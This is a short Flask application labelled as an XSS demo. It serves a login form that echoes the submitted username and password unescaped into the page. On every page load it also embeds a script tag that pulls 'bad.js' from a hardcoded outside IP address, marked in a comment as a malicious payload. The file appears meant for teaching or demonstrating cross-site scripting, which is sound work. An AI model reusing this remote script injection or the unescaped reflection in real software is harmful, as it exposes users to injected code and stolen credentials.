# Use http://webvm IP/

from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    username = request.args.get("username", "")
    password = request.args.get("password", "")

    # Hardcoded script injection (XSS)...Chnage IP address in demo
    xss_payload = '<script src="http://20.197.10.26/xss/badjs/bad.js"></script>'

    return f"""
    <html>
        <head><title>XSS Demo - Login</title></head>
        <body>
            <h2>Login Form</h2>
            <form method="GET">
                <input type="text" name="username" placeholder="Username" value="{username}"><br><br>
                <input type="password" name="password" placeholder="Password" value="{password}"><br><br>
                <input type="submit" value="Login">
            </form>

            <hr>
            <p><strong>Your Input:</strong></p>
            <div>Username: {username}</div>
            <div>Password: {password}</div>

            <!-- Embedded malicious payload -->
            {xss_payload}

        </body>
    </html>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=True)
